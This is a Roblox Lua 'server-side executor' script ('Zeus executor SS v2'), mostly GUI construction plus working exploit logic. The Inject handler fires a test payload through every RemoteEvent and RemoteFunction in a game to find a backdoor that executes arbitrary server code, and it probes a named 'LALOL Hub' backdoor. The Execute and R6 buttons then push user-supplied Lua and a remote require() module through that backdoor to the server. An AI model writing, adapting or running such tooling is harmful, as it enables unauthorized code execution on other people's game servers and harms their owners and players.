local LMG2L = {};

LMG2L["ZeusGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
LMG2L["ZeusGui_1"]["IgnoreGuiInset"] = true;
LMG2L["ZeusGui_1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
LMG2L["ZeusGui_1"]["Name"] = [[ZeusGui]];
LMG2L["ZeusGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
LMG2L["ZeusGui_1"]["ResetOnSpawn"] = false;


LMG2L["Main_2"] = Instance.new("Frame", LMG2L["ZeusGui_1"]);
LMG2L["Main_2"]["Visible"] = false;
LMG2L["Main_2"]["BorderSizePixel"] = 0;
LMG2L["Main_2"]["BackgroundColor3"] = Color3.fromRGB(24, 24, 24);
LMG2L["Main_2"]["ClipsDescendants"] = true;
LMG2L["Main_2"]["Size"] = UDim2.new(0, 658, 0, 326);
LMG2L["Main_2"]["Position"] = UDim2.new(0, 118, 0, 68);
LMG2L["Main_2"]["Name"] = [[Main]];


LMG2L["UICorner_3"] = Instance.new("UICorner", LMG2L["Main_2"]);



LMG2L["MainIMG_4"] = Instance.new("ImageLabel", LMG2L["Main_2"]);
LMG2L["MainIMG_4"]["BorderSizePixel"] = 0;
LMG2L["MainIMG_4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["MainIMG_4"]["Image"] = [[rbxassetid://127844177930647]];
LMG2L["MainIMG_4"]["Size"] = UDim2.new(0, 24, 0, 24);
LMG2L["MainIMG_4"]["BackgroundTransparency"] = 1;
LMG2L["MainIMG_4"]["Name"] = [[MainIMG]];
LMG2L["MainIMG_4"]["Position"] = UDim2.new(0, 16, 0, 10);


LMG2L["Title_5"] = Instance.new("TextLabel", LMG2L["Main_2"]);
LMG2L["Title_5"]["TextWrapped"] = true;
LMG2L["Title_5"]["BorderSizePixel"] = 0;
LMG2L["Title_5"]["TextSize"] = 18;
LMG2L["Title_5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["Title_5"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
LMG2L["Title_5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Title_5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Title_5"]["BackgroundTransparency"] = 1;
LMG2L["Title_5"]["Size"] = UDim2.new(0, 390, 0, 28);
LMG2L["Title_5"]["Text"] = [[Zeus executor SS v2]];
LMG2L["Title_5"]["Name"] = [[Title]];
LMG2L["Title_5"]["Position"] = UDim2.new(0, 50, 0, 8);


LMG2L["Rasdel_6"] = Instance.new("Frame", LMG2L["Main_2"]);
LMG2L["Rasdel_6"]["BorderSizePixel"] = 0;
LMG2L["Rasdel_6"]["BackgroundColor3"] = Color3.fromRGB(47, 47, 47);
LMG2L["Rasdel_6"]["Size"] = UDim2.new(0, 658, 0, 2);
LMG2L["Rasdel_6"]["Position"] = UDim2.new(0, 0, 0, 42);
LMG2L["Rasdel_6"]["Name"] = [[Rasdel]];


LMG2L["Rasdel_7"] = Instance.new("Frame", LMG2L["Main_2"]);
LMG2L["Rasdel_7"]["BorderSizePixel"] = 0;
LMG2L["Rasdel_7"]["BackgroundColor3"] = Color3.fromRGB(47, 47, 47);
LMG2L["Rasdel_7"]["Size"] = UDim2.new(0, 1, 0, 284);
LMG2L["Rasdel_7"]["Position"] = UDim2.new(0, 172, 0, 42);
LMG2L["Rasdel_7"]["Name"] = [[Rasdel]];


LMG2L["Exe_8"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["Exe_8"]["TextWrapped"] = true;
LMG2L["Exe_8"]["BorderSizePixel"] = 0;
LMG2L["Exe_8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["Exe_8"]["TextSize"] = 24;
LMG2L["Exe_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Exe_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Exe_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Exe_8"]["BackgroundTransparency"] = 1;
LMG2L["Exe_8"]["Size"] = UDim2.new(0, 118, 0, 40);
LMG2L["Exe_8"]["Text"] = [[Execute]];
LMG2L["Exe_8"]["Name"] = [[Exe]];
LMG2L["Exe_8"]["Position"] = UDim2.new(0, 26, 0, 50);


LMG2L["ImageLabel_9"] = Instance.new("ImageLabel", LMG2L["Exe_8"]);
LMG2L["ImageLabel_9"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ImageLabel_9"]["Image"] = [[rbxassetid://82603095454739]];
LMG2L["ImageLabel_9"]["Size"] = UDim2.new(0, 40, 0, 40);
LMG2L["ImageLabel_9"]["BackgroundTransparency"] = 1;


LMG2L["Clear_a"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["Clear_a"]["TextWrapped"] = true;
LMG2L["Clear_a"]["BorderSizePixel"] = 0;
LMG2L["Clear_a"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["Clear_a"]["TextSize"] = 24;
LMG2L["Clear_a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Clear_a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Clear_a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Clear_a"]["BackgroundTransparency"] = 1;
LMG2L["Clear_a"]["Size"] = UDim2.new(0, 118, 0, 40);
LMG2L["Clear_a"]["Text"] = [[Clear]];
LMG2L["Clear_a"]["Name"] = [[Clear]];
LMG2L["Clear_a"]["Position"] = UDim2.new(0, 26, 0, 96);


LMG2L["ImageLabel_b"] = Instance.new("ImageLabel", LMG2L["Clear_a"]);
LMG2L["ImageLabel_b"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ImageLabel_b"]["Image"] = [[rbxassetid://72956853823861]];
LMG2L["ImageLabel_b"]["Size"] = UDim2.new(0, 40, 0, 40);
LMG2L["ImageLabel_b"]["BackgroundTransparency"] = 1;


LMG2L["Inject_e"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["Inject_e"]["TextWrapped"] = true;
LMG2L["Inject_e"]["BorderSizePixel"] = 0;
LMG2L["Inject_e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["Inject_e"]["TextSize"] = 24;
LMG2L["Inject_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Inject_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Inject_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Inject_e"]["BackgroundTransparency"] = 1;
LMG2L["Inject_e"]["Size"] = UDim2.new(0, 118, 0, 40);
LMG2L["Inject_e"]["Text"] = [[Inject]];
LMG2L["Inject_e"]["Name"] = [[Inject]];
LMG2L["Inject_e"]["Position"] = UDim2.new(0, 26, 0, 142);


LMG2L["ImageLabel_f"] = Instance.new("ImageLabel", LMG2L["Inject_e"]);
LMG2L["ImageLabel_f"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ImageLabel_f"]["Image"] = [[rbxassetid://92148716143068]];
LMG2L["ImageLabel_f"]["Size"] = UDim2.new(0, 40, 0, 40);
LMG2L["ImageLabel_f"]["BackgroundTransparency"] = 1;


LMG2L["StatusLabel_10"] = Instance.new("TextLabel", LMG2L["Main_2"]);
LMG2L["StatusLabel_10"]["BorderSizePixel"] = 0;
LMG2L["StatusLabel_10"]["TextSize"] = 18;
LMG2L["StatusLabel_10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["StatusLabel_10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["StatusLabel_10"]["TextColor3"] = Color3.fromRGB(154, 154, 154);
LMG2L["StatusLabel_10"]["BackgroundTransparency"] = 1;
LMG2L["StatusLabel_10"]["Size"] = UDim2.new(0, 150, 0, 26);
LMG2L["StatusLabel_10"]["Text"] = [[Status: Client side]];
LMG2L["StatusLabel_10"]["Name"] = [[StatusLabel]];
LMG2L["StatusLabel_10"]["Position"] = UDim2.new(0, 4, 0, 296);


LMG2L["Panel_11"] = Instance.new("TextBox", LMG2L["Main_2"]);
LMG2L["Panel_11"]["Name"] = [[Panel]];
LMG2L["Panel_11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
LMG2L["Panel_11"]["BorderSizePixel"] = 0;
LMG2L["Panel_11"]["TextWrapped"] = true;
LMG2L["Panel_11"]["TextSize"] = 14;
LMG2L["Panel_11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Panel_11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
LMG2L["Panel_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Panel_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
LMG2L["Panel_11"]["MultiLine"] = true;
LMG2L["Panel_11"]["ClearTextOnFocus"] = false;
LMG2L["Panel_11"]["ClipsDescendants"] = true;
LMG2L["Panel_11"]["PlaceholderText"] = [[-- Welcome to Zeus SS! ]];
LMG2L["Panel_11"]["Size"] = UDim2.new(0, 480, 0, 286);
LMG2L["Panel_11"]["Position"] = UDim2.new(0, 176, 0, 44);
LMG2L["Panel_11"]["Text"] = [[]];
LMG2L["Panel_11"]["BackgroundTransparency"] = 1;


LMG2L["UIPadding_12"] = Instance.new("UIPadding", LMG2L["Panel_11"]);
LMG2L["UIPadding_12"]["PaddingTop"] = UDim.new(0, 10);
LMG2L["UIPadding_12"]["PaddingLeft"] = UDim.new(0, 10);


LMG2L["Close_13"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["Close_13"]["BorderSizePixel"] = 0;
LMG2L["Close_13"]["TextSize"] = 23;
LMG2L["Close_13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Close_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Close_13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Close_13"]["BackgroundTransparency"] = 1;
LMG2L["Close_13"]["Size"] = UDim2.new(0, 52, 0, 42);
LMG2L["Close_13"]["Text"] = [[X]];
LMG2L["Close_13"]["Name"] = [[Close]];
LMG2L["Close_13"]["Position"] = UDim2.new(0, 612, 0, 0);


LMG2L["OpenGui_14"] = Instance.new("ImageButton", LMG2L["ZeusGui_1"]);
LMG2L["OpenGui_14"]["BorderSizePixel"] = 0;
LMG2L["OpenGui_14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
LMG2L["OpenGui_14"]["Image"] = [[rbxassetid://127844177930647]];
LMG2L["OpenGui_14"]["Size"] = UDim2.new(0, 50, 0, 50);
LMG2L["OpenGui_14"]["Name"] = [[OpenGui]];
LMG2L["OpenGui_14"]["Position"] = UDim2.new(0, 52, 0, 62);


LMG2L["UICorner_15"] = Instance.new("UICorner", LMG2L["OpenGui_14"]);
LMG2L["UICorner_15"]["CornerRadius"] = UDim.new(1, 0);

LMG2L["R6_12"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["R6_12"]["TextWrapped"] = true;
LMG2L["R6_12"]["BorderSizePixel"] = 0;
LMG2L["R6_12"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["R6_12"]["TextSize"] = 24;
LMG2L["R6_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["R6_12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["R6_12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["R6_12"]["BackgroundTransparency"] = 1;
LMG2L["R6_12"]["Size"] = UDim2.new(0, 118, 0, 40);
LMG2L["R6_12"]["Text"] = [[R6]];
LMG2L["R6_12"]["Name"] = [[R6]];
LMG2L["R6_12"]["Position"] = UDim2.new(0, 26, 0, 188);


LMG2L["ImageLabel_13"] = Instance.new("ImageLabel", LMG2L["R6_12"]);
LMG2L["ImageLabel_13"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- LMG2L["ImageLabel_13"]["ImageContent"] = ;
LMG2L["ImageLabel_13"]["Image"] = [[rbxassetid://126709396385774]];
LMG2L["ImageLabel_13"]["Size"] = UDim2.new(0, 40, 0, 40);
LMG2L["ImageLabel_13"]["BackgroundTransparency"] = 1;


LMG2L["Re_14"] = Instance.new("TextButton", LMG2L["Main_2"]);
LMG2L["Re_14"]["TextWrapped"] = true;
LMG2L["Re_14"]["BorderSizePixel"] = 0;
LMG2L["Re_14"]["TextXAlignment"] = Enum.TextXAlignment.Right;
LMG2L["Re_14"]["TextSize"] = 24;
LMG2L["Re_14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Re_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["Re_14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG2L["Re_14"]["BackgroundTransparency"] = 1;
LMG2L["Re_14"]["Size"] = UDim2.new(0, 118, 0, 40);
LMG2L["Re_14"]["Text"] = [[RE]];
LMG2L["Re_14"]["Name"] = [[Re]];
LMG2L["Re_14"]["Position"] = UDim2.new(0, 26, 0, 234);


LMG2L["ImageLabel_15"] = Instance.new("ImageLabel", LMG2L["Re_14"]);
LMG2L["ImageLabel_15"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- LMG2L["ImageLabel_15"]["ImageContent"] = ;
LMG2L["ImageLabel_15"]["Image"] = [[rbxassetid://89882605403864]];
LMG2L["ImageLabel_15"]["Size"] = UDim2.new(0, 40, 0, 40);
LMG2L["ImageLabel_15"]["BackgroundTransparency"] = 1;


-- ===== SERVICES =====
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Main = LMG2L["Main_2"]
local Panel = LMG2L["Panel_11"]
local OpenGui = LMG2L["OpenGui_14"]
local StatusLabel = LMG2L["StatusLabel_10"]

-- ===== TYPEWRITER TITLE =====
local Title = LMG2L["Title_5"]

local texts = {
    "Zeus executor SS v2",
    "Script by goodHAXXOR and KrystalArial",
    "The best SS executor!"
}

local typingSpeed = 0.03
local deletingSpeed = 0.02
local delayBetween = 1

local function typeText(text)
    Title.Text = ""
    for i = 1, #text do
        Title.Text = string.sub(text, 1, i)
        task.wait(typingSpeed)
    end
end

local function deleteText()
    local current = Title.Text
    for i = #current, 0, -1 do
        Title.Text = string.sub(current, 1, i)
        task.wait(deletingSpeed)
    end
end

task.spawn(function()
    while true do
        for _, text in ipairs(texts) do
            typeText(text)
            task.wait(delayBetween)
            deleteText()
        end
    end
end)



-- ===== ПЕРЕМЕННЫЕ СТАТУСА =====
local isInjected = false
local BackdoorRemote = nil

-- ===== ФУНКЦИЯ СКАНА БЭКДОРА (как в LALOL Hub) =====
local function scanForBackdoor()
    local remotes = {}
    
    -- Генератор случайного имени
    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
    local function generateName(length)
        local text = ''
        for i = 1, length do
            text = text .. alphabet[math.random(1, #alphabet)]
        end
        return text
    end
    
    -- Отправка через Remote
    local function runRemote(remote, data)
        if remote:IsA('RemoteEvent') then
            remote:FireServer(data)
        elseif remote:IsA('RemoteFunction') then
            spawn(function() 
                pcall(function()
                    remote:InvokeServer(data)
                end)
            end)
        end
    end
    
    -- Проверка защищённого бэкдора
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code
        while true do
            code = generateName(math.random(12, 30))
            if not remotes[code] then break end
        end
        spawn(function() 
            pcall(function()
                protected_backdoor:InvokeServer('lalol hub join today!!', "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
            end)
        end)
        remotes[code] = protected_backdoor
    end
    
    -- Сканируем все RemoteEvent и RemoteFunction
    for _, remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then
            continue
        end
        
        -- Пропускаем системные
        local fullName = remote:GetFullName()
        if string.split(fullName, '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
            continue
        end
        
        if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' then
            continue
        end
        
        if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
            continue
        end
        
        -- Отправляем тест
        local code
        while true do
            code = generateName(math.random(12, 30))
            if not remotes[code] then break end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
        remotes[code] = remote
    end
    
    -- Ждём и проверяем результат
    for i = 1, 50 do
        for code, remote in pairs(remotes) do
            local obj = workspace:FindFirstChild(code)
            if obj then
                -- Нашли бэкдор!
                pcall(function() obj:Destroy() end)
                return remote
            end
        end
        task.wait(0.05)
    end
    
    return nil
end

-- ===== ОБРАБОТЧИК INJECT =====
LMG2L["Inject_e"].MouseButton1Click:Connect(function()
    StatusLabel.Text = "Status: Injecting"
    
    -- Запускаем сканирование
    local backdoor = scanForBackdoor()
    
    if backdoor then
        BackdoorRemote = backdoor
        isInjected = true
        StatusLabel.Text = "Status: Injected!"
        wait(2)
        StatusLabel.Text = "Status: Server side"
        print("[Zeus] Бэкдор найден:", backdoor:GetFullName())
    else
        isInjected = false
        BackdoorRemote = nil
        StatusLabel.Text = "Status: Not injected :("
        wait(2)
        StatusLabel.Text = "Status: Client side"
        print("[Zeus] Бэкдор не найден")
    end
end)

-- ===== ВЫПОЛНЕНИЕ КОДА =====
LMG2L["Exe_8"].MouseButton1Click:Connect(function()
    local code = Panel.Text
    if not code or code == "" then
        return
    end
    
    if isInjected and BackdoorRemote then
        -- Выполнение на сервере через найденный Remote
        print("[Zeus] Выполнение на сервере через:", BackdoorRemote:GetFullName())
        
        if BackdoorRemote:IsA('RemoteEvent') then
            BackdoorRemote:FireServer(code)
        elseif BackdoorRemote:IsA('RemoteFunction') then
            spawn(function()
                local success, result = pcall(function()
                    return BackdoorRemote:InvokeServer(code)
                end)
                if success and result then
                    print("[Zeus] Результат:", result)
                end
            end)
        end
    else
        -- Выполнение на клиенте
        print("[Zeus] Выполнение на клиенте")
        pcall(function()
            loadstring(code)()
        end)
    end
end)

-- ===== SCROLL =====
local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.BackgroundTransparency = 1
Scroll.Size = Panel.Size
Scroll.Position = Panel.Position
Scroll.CanvasSize = UDim2.new(0,0,0,0)
Scroll.ScrollBarThickness = 6
Scroll.BorderSizePixel = 0

Panel.Parent = Scroll
Panel.Size = UDim2.new(1, -10, 0, 276)
Panel.Position = UDim2.new(0, 45, 0, 0)

-- ===== LINE NUMBERS =====
local LineNumbers = Instance.new("TextLabel", Scroll)
LineNumbers.BackgroundTransparency = 1
LineNumbers.Position = UDim2.new(0, 5, 0, 10)
LineNumbers.Size = UDim2.new(0, 35, 0, 276)
LineNumbers.FontFace = Panel.FontFace
LineNumbers.TextSize = Panel.TextSize
LineNumbers.TextColor3 = Color3.fromRGB(140,140,140)
LineNumbers.TextXAlignment = Enum.TextXAlignment.Right
LineNumbers.TextYAlignment = Enum.TextYAlignment.Top
LineNumbers.Text = "1"

-- ===== REFRESH =====
local function refresh()
    local text = Panel.Text or ""

    local count = 1
    for _ in text:gmatch("\n") do
        count += 1
    end

    local lines = {}
    for i = 1, count do
        lines[i] = i
    end

    LineNumbers.Text = table.concat(lines, "\n")

    local h = math.max(276, count * 18 + 20)

    Panel.Size = UDim2.new(1, -50, 0, h)
    LineNumbers.Size = UDim2.new(0, 35, 0, h)
    Scroll.CanvasSize = UDim2.new(0, 0, 0, h + 20)
end

Panel:GetPropertyChangedSignal("Text"):Connect(function()
    task.defer(refresh)
end)

refresh()

-- ===== CLEAR =====
LMG2L["Clear_a"].MouseButton1Click:Connect(function()
    Panel.Text = ""
end)

-- ===== ANIMATION =====
local MainPos = Main.Position
local OpenPos = OpenGui.Position

local function tween(gui, size, time, pos)
    local oldAnchor = gui.AnchorPoint

    gui.AnchorPoint = Vector2.new(0.5, 0.5)
    gui.Position = UDim2.new(
        pos.X.Scale,
        pos.X.Offset + gui.Size.X.Offset/2,
        pos.Y.Scale,
        pos.Y.Offset + gui.Size.Y.Offset/2
    )

    local t = TweenService:Create(gui, TweenInfo.new(time, Enum.EasingStyle.Quad), {
        Size = size
    })

    t:Play()
    t.Completed:Wait()

    gui.AnchorPoint = oldAnchor
    gui.Position = pos
end

-- CLOSE
LMG2L["Close_13"].MouseButton1Click:Connect(function()
    tween(Main, UDim2.new(0,0,0,0), 0.2, MainPos)
    Main.Visible = false

    OpenGui.Size = UDim2.new(0,0,0,0)
    OpenGui.Visible = true

    tween(OpenGui, UDim2.new(0,50,0,50), 0.2, OpenPos)
end)

-- OPEN
OpenGui.MouseButton1Click:Connect(function()
    tween(OpenGui, UDim2.new(0,0,0,0), 0.2, OpenPos)
    OpenGui.Visible = false

    Main.Size = UDim2.new(0,0,0,0)
    Main.Visible = true

    tween(Main, UDim2.new(0, 658, 0, 326), 0.2, MainPos)
end)

-- ===== DRAG =====
local function drag(gui)
    local dragging = false
    local dragInput
    local dragStart
    local startPos

    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 
        or input.UserInputType == Enum.UserInputType.Touch then

            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            dragInput = input
        end
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement 
        or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart

            gui.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    gui.InputEnded:Connect(function(input)
        if input == dragInput then
            dragging = false
        end
    end)
end


drag(Main)
drag(OpenGui)

-- ===== ОБРАБОТЧИК Re (РЕСПАВН ПЕРСОНАЖА) =====
LMG2L["Re_14"].MouseButton1Click:Connect(function()
    local character = Players.LocalPlayer.Character
    if character and character:FindFirstChild("Humanoid") then
        character.Humanoid.Health = 0
    end
end)

-- ===== ОБРАБОТЧИК R6 =====
LMG2L["R6_12"].MouseButton1Click:Connect(function()
    if not isInjected or not BackdoorRemote then return end
    
    local code = [[require(0x71E8BD0C7A44):R6("]] .. Players.LocalPlayer.Name .. [[")]]
    
    if BackdoorRemote:IsA('RemoteEvent') then
        BackdoorRemote:FireServer(code)
    elseif BackdoorRemote:IsA('RemoteFunction') then
        spawn(function()
            pcall(function()
                BackdoorRemote:InvokeServer(code)
            end)
        end)
    end
end)


return LMG2L["ZeusGui_1"], require;